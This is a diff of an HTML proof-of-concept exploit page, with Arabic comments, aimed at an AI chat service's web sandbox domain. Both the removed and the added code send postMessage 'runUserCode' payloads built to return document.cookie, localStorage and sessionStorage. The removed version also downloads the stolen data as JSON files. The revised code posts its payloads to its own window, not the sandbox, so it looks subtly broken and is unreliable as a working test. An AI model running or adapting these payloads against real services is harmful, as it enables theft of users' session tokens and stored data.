@@ -2,47 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Remote Sandbox PoC</title>
+  <title>🚀 Sandbox Remote PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    button { padding: 10px 20px; margin-top: 20px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
+    #log { margin-top: 20px; white-space: pre-wrap; background:#000; padding:10px; border:1px solid #0f0; }
+  </style>
 </head>
 <body>
-  <h2>🚀 Remote Data Extraction PoC</h2>
+  <h2>🔥 Remote CTF PoC – Sandbox Exploit Test</h2>
+  <p>Click the button to send payloads to <code>web-sandbox.oaiusercontent.com</code>.</p>
+
   <button id="launchBtn">Open & Exploit Sandbox</button>
+  <div id="log"></div>
 
   <script>
-    let victimWin;
+    const log = (msg) => {
+      console.log(msg);
+      document.getElementById("log").innerText += msg + "\n";
+    };
 
     function launch() {
-      console.log("🚀 Remote PoC started...");
+      log("🚀 PoC started – sending payloads...");
 
-      // 🔗 حط هنا رابط sandbox الحقيقي (اللي يطلع لك من preview)
-      const sandboxUrl = "https://chatgpt.com/ces/v1/t";
+      const target = "https://web-sandbox.oaiusercontent.com/";
 
-      victimWin = window.open(sandboxUrl, "victim", "width=900,height=700");
+      // payloads لتجربة الوصول للبيانات
+      const payloads = [
+        ["CALL", "runUserCode", ["return document.cookie"]],
+        ["CALL", "runUserCode", ["return Object.keys(localStorage)"]],
+        ["CALL", "runUserCode", ["return Object.keys(sessionStorage)"]],
+        ["CALL", "screenshot", []],
+        ["CALL", "echo", [{poc:"hello"}]]
+      ];
 
-      window.addEventListener("message", (evt) => {
-        console.log("📩 Got message:", evt.origin, evt.data);
-
-        // حفظ البيانات وتنزيلها كملف JSON
-        const blob = new Blob([JSON.stringify(evt.data, null, 2)], {type: "application/json"});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = "sandbox_data_" + Date.now() + ".json";
-        a.click();
-        console.log("💾 File download triggered.");
+      window.addEventListener("message", (event) => {
+        log("📩 Response from sandbox:");
+        log(JSON.stringify(event.data, null, 2));
       });
 
-      // انتظر شوية ثم ابعث payload
-      setTimeout(() => {
-        console.log("📡 Sending exploit payload to sandbox...");
-        victimWin.postMessage(
-          ["CALL", "runUserCode", ["return {cookies: document.cookie, localStorage, sessionStorage, url: location.href}"]],
-          "*"
-        );
-      }, 5000);
+      // إرسال payloads كل 3 ثواني
+      payloads.forEach((msg, i) => {
+        setTimeout(() => {
+          log("➡️ Sending payload #" + i + ": " + msg[1]);
+          window.postMessage(msg, "*");
+        }, i * 3000);
+      });
     }
 
-    // اربط الزر بالدالة بعد تحميل الصفحة
+    // اربط الزر بالدالة
     document.getElementById("launchBtn").addEventListener("click", launch);
   </script>
 </body>
